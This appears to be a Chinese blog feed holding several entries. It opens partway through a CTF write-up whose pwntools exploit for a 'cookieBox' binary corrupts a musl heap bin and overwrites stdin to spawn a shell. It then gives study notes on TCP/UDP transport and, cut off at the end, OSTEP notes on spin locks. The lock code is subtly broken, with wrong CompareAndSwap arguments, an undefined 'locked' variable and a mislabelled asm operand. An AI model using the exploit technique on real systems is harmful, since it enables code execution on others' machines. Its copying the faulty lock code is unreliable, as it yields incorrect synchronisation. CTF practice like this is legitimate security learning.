c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以实现写地址，覆盖bin-&gt;head为stdin-0x20，打FSOP即可，要注意stdin-0x10和-0x8处存放的地址要可写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./cookieBox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the Content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input the idx:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="comment"># db(&#x27;0x0400AA8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;0x0400BB3&#x27;)#free</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x292e50</span></span><br><span class="line">stdin=libc+<span class="number">0x292200</span></span><br><span class="line">system=libc+<span class="number">0x42688</span></span><br><span class="line">heap=libc+ <span class="number">0x292b00</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#为了申请stdin时他的next和prec可写 同时会使他的bitmap位置零</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stdin-<span class="number">0x20</span>) + p64(stdin-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>)   <span class="comment"># 5</span></span><br><span class="line">delete(<span class="number">1</span>)   </span><br><span class="line">edit(<span class="number">4</span>, p64(heap) + p64(stdin - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># db(&#x27;0x0400AA8&#x27;)#malloc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span>    <span class="comment"># stdin-&gt;flags</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">32</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># stdin-&gt;wpos</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0xbeefdead</span>)  <span class="comment"># stdin-&gt;wbase</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(system)      <span class="comment"># stdin-&gt;write</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)<span class="comment">#7</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/09/07/2023-ycb/image-20230910004155958.png" alt="image-20230910004155958"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络:传输层</title>
      <link href="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
      <url>/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><p>传输层协议在端系统中实现而不是路由器,简单起见把<strong>运输层分组称为报文段</strong>，<strong>网络层分组称为数据报</strong></p><p>UDP，TCP的基本责任将两个端系统间IP的交付服务拓展到端系统上两个进程之间的交付服务</p><p>将主机间交付扩展到进程间交付被称为运输层的多路复用与多路解复用</p><h2 id="多路复用与多路解复用"><a href="#多路复用与多路解复用" class="headerlink" title="多路复用与多路解复用"></a>多路复用与多路解复用</h2><ul><li>多路复用:从源主机不同套接字收集数据块，并为每个数据块封装上首部信息生成报文段，报文段投递到网络层</li><li>多路解复用:将传输层报文段的数据交付到正确的套接字</li></ul><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><h3 id="报文"><a href="#报文" class="headerlink" title="报文"></a>报文</h3><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230905130551078.png" alt="image-20230905130551078"></p><p>端口号：通过端口号目的主机可以实现多路解复用</p><p>长度：UDP报文中的字节数(UDP 报文头和 UDP 数据长度)</p><p>校验值：检验数据在传输过程中是否被损坏，RFC中标准要求，发送端应该计算检验和，接收端可选</p><ul><li>发送方：对报文段的<strong>所有16bit字的和</strong>进行<strong>反码</strong>运算，其中和的溢出都被回卷(把进位加上，如三bit数 110+011&#x3D;010)，得到的结果就是校验值</li><li>接收方：算出报文段的<strong>所有16bit字外加校验码的和，同样溢出都被回卷</strong>，结果是1111 1111 1111 1111则数据完整</li></ul><blockquote><p>残存错误：这种检错是有限的，会出现有些数据错误但是得到的校验和是正确的情况，叫做残存错误</p></blockquote><h2 id="可靠数据传输原理"><a href="#可靠数据传输原理" class="headerlink" title="可靠数据传输原理"></a>可靠数据传输原理</h2><ul><li><p>假设信道保证发送分组，不丢失分组，且分组按照发送顺序被接收，但是分组数据可能受损</p><p><strong>简单的解决办法</strong></p><p>发送方发送完一个分组后等待，接收方通过校验和来确认分组完整性，完整则回复<strong>肯定确定</strong>(Positive Acknowledgment,ACK)分组通知发送方发送下一个分组，否则发送<strong>否定确定</strong>(Negative Acknowledgment,NCK)分组通知发送方重传当前分组</p><p><strong>新的问题：ack&#x2F;nck出错怎么办？</strong></p><p>给ack&#x2F;nck加上校验和，给分组加个<strong>序号字段</strong>，发送方收到的反馈分组ack&#x2F;nck出错时，不管三七二十一，都重传分组，接收方根据分组序号和上次分组的序号比较结果来反馈发送方，如果接收到的序号和等待的序号不一样，证明ack&#x2F;nck分组出错了，只需要重传个ACK，并丢弃掉这个分组即可</p><p><strong>不使用nck</strong></p><p>接收端在接收到错误分组不发送 NAK, 而是对上次正确接收的分组发送一个ACK，发送方接收到对同一个分组的两个ACK就知道没有正确发送该ack分组的下一个分组 </p><p>比如我们现在要传输p0 p1 p2 三个分组，接收方接收到正确的p0后发送ACK 0表示正确接收p0，发送方继续发送p1，如果接收方正确接收p1，发送ACK 1表示正确接收，否则发送ACK 0表示接收P1出错</p><p>不使用nck简化了机制，来为后面实现流水线pipeline做准备</p><p>综上所述的效果 </p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906114728476.png" alt="image-20230906114728476"></p></li></ul><ul><li><p>假设信道可能丢失分组，分组数据可能受损</p><p>发送方采用超时重传机制，发送方发送分组后启动倒计数定时器，定时器过期后没有接收到ack，再次发送分组，其中ack丢失带来的发送重复分组，可以通过序号来处理</p></li></ul><blockquote><p>凡事都要做最坏的打算</p></blockquote><h2 id="流水线可靠数据传输协议"><a href="#流水线可靠数据传输协议" class="headerlink" title="流水线可靠数据传输协议"></a>流水线可靠数据传输协议</h2><p>允许发送方在未得到对方确认的情况下一次发送多个分组需要的条件</p><ul><li>增加序号范围</li><li>发送方缓存已发送未确定的多个分组：未得到确认，可能需要重传</li><li>接收方缓存多个已接收的分组：上层用户取用数据的速率 ≠ 接收到的数据速率；接收到的数据可能乱序，排序交付（可靠）</li></ul><p>两种通用的流水线协议：回退N步(Go-Back-N，GBN)和选择重传(Selective Repeat，SR)</p><h3 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h3><p>发送窗口：发送缓冲区内容的一个范围</p><p>接收窗口：控制哪些分组可以接收。 接收窗口 &#x3D; 接收缓冲区</p><h3 id="回退N步-Go-Back-N，GBN"><a href="#回退N步-Go-Back-N，GBN" class="headerlink" title="回退N步(Go-Back-N，GBN)"></a>回退N步(Go-Back-N，GBN)</h3><ul><li>发送窗口尺寸 &gt; 1</li><li>接收窗口尺寸 &#x3D; 1</li></ul><p>发送缓存</p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906195343476.png" alt="image-20230906195343476"></p><p><strong>发送方：</strong></p><ul><li>发送窗口未满时，产生一个分组并将其发送，并把nextseqnum++；</li><li>窗口已满，发送方只需将数据返回给上层，隐式地指示上层该窗口已满，或者先缓存下来以后发送</li><li>只有最早的<strong>已发送但未被确认的分组</strong>拥有的定时器</li><li>接收到ack后base++；如果此时base&#x3D;&#x3D;nextseqnum则停止定时器，否则说明还有已发送但未被确认的分组，则重新开始计数器</li><li>定时器超时则重新发送base~nextseqnum的所有分组</li></ul><p><strong>接收方：</strong></p><ul><li><p>接收窗口的尺寸为1，只能顺序接收，接收后直接交付上方</p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906214049306.png" alt="image-20230906214049306"></p><p>比如现在只有0可以接收，其他分组到达会被丢弃，接收后窗口滑动到1，向发送方发送ack，然后等待接收</p></li></ul><h3 id="选择重传-Selective-Repeat，SR"><a href="#选择重传-Selective-Repeat，SR" class="headerlink" title="选择重传(Selective Repeat，SR)"></a>选择重传(Selective Repeat，SR)</h3><ul><li>发送窗口尺寸 &gt; 1</li><li>接收窗口尺寸 &gt; 1</li></ul><p>发送缓存</p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906225824770.png" alt="image-20230906225824770"></p><p><strong>发送方：</strong></p><ul><li>发送窗口未满时，产生一个分组并将其发送，并把nextseqnum++；</li><li>窗口已满，发送方只需将数据返回给上层，隐式地指示上层该窗口已满，或者先缓存下来以后发送</li><li><strong>所有已发送但未被确认的分组</strong>拥有的定时器</li><li>只发送定时器超时的分组</li></ul><p><strong>接收方：</strong></p><ul><li>接收窗口的尺寸 &gt; 1，可以乱序接收</li><li>低序号的分组到来，接收窗口移动</li><li>高序号分组乱序到，缓存但不交付（因为要实现Reliable Data Transfer，不允许失序），不滑动，分组都收到后最后一起交付给上方</li></ul><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906214815621.png" alt="image-20230906214815621"></p><ul><li><p>接收到分组后发送ACKn(ack+序号)，由于这个ack可能丢失，所以不管接收方接收到什么分组，即使是当前窗口很早之前的分组，也应该发送ACKn,不然会导致发送方窗口不滑动</p><blockquote><p>对SR协议而言，这就意味着发送方和接收方的窗口 并不总是一致 。</p></blockquote></li></ul><p><strong>窗口的最大尺寸</strong></p><p>GBN: 2<sup>n</sup>-1</p><p>SR:2<sup>n-1</sup></p><p>具体原因可以看</p><ul><li><a href="https://zhuanlan.zhihu.com/p/450499911">https://zhuanlan.zhihu.com/p/450499911</a></li><li><a href="https://www.cnblogs.com/zqybegin/p/13810647.html">https://www.cnblogs.com/zqybegin/p/13810647.html</a></li></ul><p>均是为了超时重传接受方能够区分到底是新数据还是老数据。</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230907131528781.png" alt="image-20230907131528781"></p><p><strong>序号</strong>：发送报文段数据首字节在应用层交下来字节流的偏移量+字节流初始序号(初始序号在建立连接时确定，一般随机地选择初始序号)</p><p><strong>确认序号</strong>(Acknowledge number)：期望从另一方收到的下一个字节的序号</p><p><strong>首部长度</strong>：TCP选项字段是长度是可变的，导致报文段长度可变，4bit首部长度用来表示32bit的字为单位的TCP首部长度</p><p><strong>表示字段</strong>：</p><ul><li>URG：紧急指针标志，为1时表示紧急指针有效，该报文应该优先传送</li><li>ACK：ACK &#x3D; 1报文段为确认报文段，为0表示数据段不包含确认信息，确认号被忽略</li><li>PSH &#x3D; 1 表示该报文段高优先级，接收方TCP应尽快推送给接收应用程序</li><li>RST &#x3D; 1，表示 TCP 连接中出现严重错误，需要释放并重新建立连接，称为复位报文段</li><li>SYN &#x3D; 1，表明这是一个请求连接报文段，称为同步报文段</li><li>FIN &#x3D; 1，表示此报文段的发送方的数据已经发送完毕，并要求释放 TCP 连接，称为结束报文段</li></ul><p><strong>接收窗口</strong>：窗口大小的值是指，从本报文段首部中的确认号算起，接收方目前允许对方发送的数据量。用于流量控制</p><p>以太网和PPP链路层协议都具有1500字节的MTU(Maximum Transmission Unit, MTU)，去除20字节ip头，20字节TCP头，最大报文段长度(Maximum Segment Size,<br>MSS)一般为1460</p><h3 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h3><p>TCP采用了类似于GBN的单一计时器，只为最早发送但未确认的报文段设置计时器，且定时器过期只发送这一个报文段</p><p>比如发送方发送了，数据流中0~1460的A报文段，1461~2921的B报文段,2922~4382的C报文段，后续报文段D，E，F，G，发送方只为0~1460的A报文段设置计时器</p><p>接收方接收到A报文，B报文段丢失，接收到C报文段，对于乱序的接收TCP程序员可自行处理，丢弃或者缓存，对于收到C D E F G都会向发送方发送<strong>确认序号</strong>为B的ACK，发送方接收到三个相同冗余的ACK则立即重传B分组，不用等计时器过期，这种操作叫<strong>快速重传</strong></p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230907215922072.png" alt="image-20230907215922072"></p><h3 id="TCP-3次握手"><a href="#TCP-3次握手" class="headerlink" title="TCP 3次握手"></a>TCP 3次握手</h3><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230907220150943.png" alt="image-20230907220150943"></p><ol><li>客户端发送SYN&#x3D;1，不包含应用层数据的tcp报文段，随机选择初始序号seq&#x3D;J，称为同步报文段或SYN 报文段</li><li>服务器收到SYN报文段，服务器分配TCP缓存和变量，发送SYN&#x3D;1，ACK&#x3D;1，确认序号ack&#x3D;J+1，随机选择初始序号seq&#x3D;K的允许连接报文，称为SYNACK报文段</li><li>客户端收到 SYNACK 报文段后，客户端分配TCP缓存和变量，发送SYN&#x3D;1 ACK&#x3D;1，确认序号ack&#x3D;K+1的报文确认连接，一般还会在此报文段携带数据</li></ol><h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a><a href="https://juejin.cn/post/7063829623024386056">TCP 四次挥手</a></h3><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230908002803834.png" alt="image-20230908002803834"></p><ol><li>客户端发送FIN&#x3D;1，seq&#x3D;u的结束报文段，FIN-WAIT-1 阶段，TCP半关闭阶段</li><li>服务器接收到客户端请求断开连接的 FIN 报文后，结束 ESTABLISHED 阶段，进入 CLOSE-WAIT 阶段并返回一段 TCP 报文，ACK&#x3D;1，Seq &#x3D; v，ack &#x3D; u + 1，TCP半关闭阶段，而A收到B的确认后，进入FIN-WAIT-2状态，等待B发出的连接释放报文段</li><li>因为断开连接是A提出的，可能B还有数据要传输，所以不能和上一次ACK一起发，当B数据传输完毕后，B发出连接释放报文段</li><li>A收到B的连接释放报文段后，对此发出确认报文段（ACK &#x3D; 1，seq&#x3D;u+1，ack&#x3D;w+1）,A进入TIME-WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，A才进入CLOSE状态。</li></ol><blockquote><p>为什么A在TIME-WAIT状态必须等待2MSL（最大报文生存时间）的时间？</p><ul><li>保证A、B正常进入CLOSED状态：最后一个ACK丢失可能丢失，TCP服务器进程对之前所发送的TCP连接释放报文段的超时重传，如果TCP客户进程属于关闭状态，会导致服务器反复重传无法关闭</li><li>2MSL时长，可以使本次连接持续时间内所产生的所有报文段都从网络中消失，保证下一个新的TCP连接中，不会出现旧连接中的报文段</li></ul></blockquote><h2 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h2><p>CongWin拥塞窗口 Threshold 慢启动动阙值</p><ul><li>当 CongWin &lt; Threshold, 发送端处于慢启动阶段（slow-start ）, 窗口指数性(平方增加MSS)增长</li><li>当 CongWin &gt; Threshold, 发送端处于拥塞避免阶段（ congestion-avoidance ） , 窗口线性增长(+1 MSS)</li><li>当收到三个重复的 ACKs(triple duplicate ACK),Threshold 设置成 CongWin&#x2F;2 ，CongWin&#x3D;Threshold+3.</li><li>当超时事件发生时 timeout, Threshold&#x3D;CongWin&#x2F;2CongWin&#x3D;1 MSS ，进入 慢启动SS 阶段</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 锁🔒</title>
      <link href="/2023/09/03/OSTEP-28-LOCK/"/>
      <url>/2023/09/03/OSTEP-28-LOCK/</url>
      
        <content type="html"><![CDATA[<p>锁将原本由操作系统调度线程的混乱状态变得可控</p><h2 id="评价锁🔒"><a href="#评价锁🔒" class="headerlink" title="评价锁🔒"></a>评价锁🔒</h2><ul><li>正确性:能否阻止线程进入临界区</li><li>公平性：是否每一个竞争线程有公平的机会抢到锁</li><li>性能：加锁之后增加的时间开销<ul><li>没有竞争，一个线程加锁开锁</li><li>一个cpu，多个线程竞争</li><li>多个cpu，多个线程竞争</li></ul></li></ul><h2 id="控制中断"><a href="#控制中断" class="headerlink" title="控制中断"></a>控制中断</h2><p>最早的单处理器解决方法:进入临界区前关中断</p><p>缺点</p><ul><li>需要允许程序开关中断</li><li>多处理器不可行，其他处理器上线程可以进入临界区</li><li>关中断期间可能导致其他正常中断丢失</li><li>效率低</li></ul><h2 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h2><p>与其软件上利用:DEKKER,PETERSON等算法，不如硬件支持👌,增加了一些硬件原语</p><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><strong>xchg （atomic exchange，原子交换）指令</strong>，通常称为测试并设置指令（test-and-set）</p><p><strong>自旋锁spin lock实现</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="type">int</span> *addr, <span class="type">int</span> newval)</span> &#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = YES;<span class="comment">//flag为YES代表可以进临界区，</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">retry:</span><br><span class="line">  <span class="type">int</span> got = xchg(&amp;flag, NOPE);</span><br><span class="line">  <span class="keyword">if</span> (got == NOPE)</span><br><span class="line">    <span class="keyword">goto</span> retry;</span><br><span class="line">  assert(got == YES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">  xchg(&amp;flag, YES)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上面代码等价的精简</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = <span class="number">0</span><span class="comment">//flag为0代表没有锁上，可以进临界区</span></span><br><span class="line"><span class="type">void</span> lock() &#123; <span class="keyword">while</span>(xchg(&amp;flag,<span class="number">1</span>))&#125;</span><br><span class="line"><span class="type">void</span> unlock() &#123; xchg(&amp;locked, <span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><p><strong>cpmxhg指令 Compare and Exchange</strong> </p><blockquote><p>x86&#x2F;64架构中的cmpxchg指令是如何实现并保证原子性的</p><p><a href="https://www.zhihu.com/question/492576993">https://www.zhihu.com/question/492576993</a></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">CompareAndSwap</span><span class="params">(<span class="type">int</span> *ptr, <span class="type">int</span> expected, <span class="type">int</span> new)</span> &#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> ret;</span><br><span class="line">    <span class="comment">// Note that sete sets a &#x27;byte&#x27; not the word</span></span><br><span class="line">    __asm__ __volatile__ (</span><br><span class="line">    <span class="string">&quot; lock\n&quot;</span></span><br><span class="line">    <span class="string">&quot; cmpxchgl %2,%1\n&quot;</span></span><br><span class="line">    <span class="string">&quot; sete %0\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=q&quot;</span> (ret), <span class="string">&quot;=m&quot;</span> (*ptr)</span><br><span class="line">    : <span class="string">&quot;r&quot;</span> (new), <span class="string">&quot;m&quot;</span> (*ptr), <span class="string">&quot;a&quot;</span> (old)<span class="comment">//对于相同的&quot;m&quot; (*ptr)似乎是按照后面的来算的，所以这里%0代表ret，%1代表 new， %2代表*ptr</span></span><br><span class="line">    : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>cmpxchg dest,src:将AL、AX、EAX或RAX寄存器中的值与第一个操作数dest（目标操作数）进行比较。如果两个值相等，则将第二个操作数src（源操作数）加载到dest目标操作数中同时ZF标志位置1。 如果不相等，则目标操作数被加载到AL、AX、EAX或RAX寄存器中，x同时ZF标志位置0。</p><p>SETE r&#x2F;m8:Set byte if equal.设置r&#x2F;m8为zf标志位的值</p></blockquote><p>c的伪代码就是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CompareAndSwap</span><span class="params">(<span class="type">int</span> *ptr, <span class="type">int</span> expected, <span class="type">int</span> new)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret = *ptr;</span><br><span class="line">    <span class="keyword">if</span> (ret == expected) &#123;</span><br><span class="line">        *ptr = new;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>自旋锁spin lock实现</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//flag为0代表没有锁上，可以进临界区</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span>&#123;<span class="keyword">while</span>(CompareAndSwap(flag,<span class="number">1</span>,<span class="number">1</span>) == <span class="number">1</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span>&#123;flag = <span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="riscv"><a href="#riscv" class="headerlink" title="riscv"></a>riscv</h3><p>LR&#x2F;SC 指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lr.&#123;w/d&#125;.&#123;aqrl&#125; rd, (rs1)</span><br><span class="line">从内存地址 rs1 中加载内容到 rd 寄存器。然后在 rs1 对应地址上设置保留标记(reservation set),w/d 分别对应 32 位/64 位版本,中断、其他处理器写入都会导致标记消除</span><br><span class="line">sc.&#123;w/d&#125;.&#123;aqrl&#125; rd, rs2, (rs1)</span><br><span class="line">sc指令在把rs2值写到rs1地址之前，会先判断 rs1 内存地址是否有设置保留标记，如果设置了，则把 rs2 值正常写入到 rs1 内存地址里，并把 rd 寄存器设置成 0，表示保存成功。如果 rs1 内存地址没有设置保留标记，则不保存，并把 rd 寄存器设置成 1 表示保存失败。不管成功还是失败，sc指令都会把当前hart保留的所有保留标记全部清除</span><br></pre></td></tr></table></figure><p><strong>xchg升级版：Compare-and-Swap 的 LR&#x2F;SC 实现</strong></p><figure 